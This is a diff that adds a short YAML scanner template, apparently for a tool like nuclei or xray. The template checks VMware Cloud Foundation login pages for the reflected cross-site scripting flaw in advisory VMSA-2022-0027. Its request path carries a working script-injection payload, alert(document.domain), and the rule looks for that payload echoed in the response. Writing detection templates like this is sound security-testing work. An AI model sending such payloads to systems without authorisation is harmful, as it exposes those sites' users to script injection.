@@ -1,0 +1,10 @@
+name: vmware-cloud-xss
+rules:
+  - method: GET
+    path: "/login/?redirectTo=/tenant/e&service=</script><script>alert(document.domain)</script>"
+    expression: |
+      response.status == 200 && response.body.bcontains(b"</script><script>alert(document.domain)</script>") && response.body.bcontains(b"let tokens = \"") && response.content_type.contains("text/html")
+detail:
+  author: tess
+  links:
+    - https://www.vmware.com/security/advisories/VMSA-2022-0027.html
